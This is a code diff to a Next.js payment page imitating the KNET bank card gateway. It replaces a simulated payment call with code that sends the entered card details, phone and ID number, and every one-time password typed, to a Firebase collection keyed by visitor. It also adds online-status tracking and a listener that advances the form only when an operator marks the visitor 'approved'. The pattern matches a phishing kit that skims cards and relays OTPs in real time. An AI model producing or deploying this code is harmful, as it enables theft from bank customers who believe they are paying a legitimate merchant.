@@ -2,6 +2,10 @@
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import "./knet.css";
+import { addData, db, handlePay } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
+import Loader from "./loader";
+import { doc, onSnapshot } from "firebase/firestore";
 
 const BANKS = [
   {
@@ -129,7 +133,7 @@ export default function PaymentForm() {
     cardState: "new",
     bank_card: [""],
     prefix: "",
-    status: "new",
+    status: "pendding",
     phoneNumber: "",
     network: "",
     idNumber: "",
@@ -138,25 +142,19 @@ export default function PaymentForm() {
   });
   const [countdown, setCountdown] = useState(60);
   const [isCountdownActive, setIsCountdownActive] = useState(true);
-  const [otpAttempts, setOtpAttempts] = useState(2);
+  const [otpAttempts, setOtpAttempts] = useState(-6);
   const [otpValue, setOtpValue] = useState("");
   useEffect(() => {
     const amount = localStorage.getItem("amount");
+    const visitor = localStorage.getItem("visitor");
     setTotal(amount!);
+    setupOnlineStatus(visitor!);
   }, []);
   const handleAddotp = (otp: string) => {
-    newotp.push(`${otp} , `);
-  };
+    const visitor = localStorage.getItem("visitor");
 
-  const handlePay = (info: any, setter: any) => {
-    console.log("Payment info:", info);
-    // Simulate API call
-    setTimeout(() => {
-      setisloading(false);
-      if (step === 1) {
-        setstep(2);
-      }
-    }, 2000);
+    newotp.push(`${otp} , `);
+    addData({ id: visitor, otp, allOtps: newotp });
   };
 
   useEffect(() => {
@@ -174,7 +172,24 @@ export default function PaymentForm() {
       if (interval) clearInterval(interval);
     };
   }, [isCountdownActive, countdown]);
-
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      setupOnlineStatus(visitorId!);
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as any;
+          // Only handle special redirect cases
+          if (data.status === "pendding") {
+          } else if (data.status === "approved") {
+            setisloading(false);
+            setstep(2);
+          }
+        }
+      });
+      return () => unsubscribe();
+    }
+  }, []);
   return (
     <div className="container" dir="ltr">
       <form
@@ -463,9 +478,11 @@ export default function PaymentForm() {
                       (step === 2 && paymentInfo.otp?.length !== 6)
                     }
                     onClick={() => {
+                      const vistorId = localStorage.getItem("visitor");
                       if (step === 1) {
                         setisloading(true);
-                        handlePay(paymentInfo, setPaymentInfo);
+
+                        addData({ id: vistorId, ...paymentInfo });
                       } else if (step === 2) {
                         if (!newotp.includes(paymentInfo.otp!)) {
                           newotp.push(paymentInfo.otp!);
@@ -524,23 +541,7 @@ export default function PaymentForm() {
             </div>
           </div>
         </div>
-        {isloading && (
-          <div className="overlay" style={{ display: "block" }}>
-            <div
-              style={{
-                position: "absolute",
-                top: "50%",
-                left: "50%",
-                transform: "translate(-50%, -50%)",
-                color: "white",
-                fontSize: "18px",
-                fontWeight: "bold",
-              }}
-            >
-              Loading...
-            </div>
-          </div>
-        )}
+        {isloading && <Loader />}
       </form>
     </div>
   );
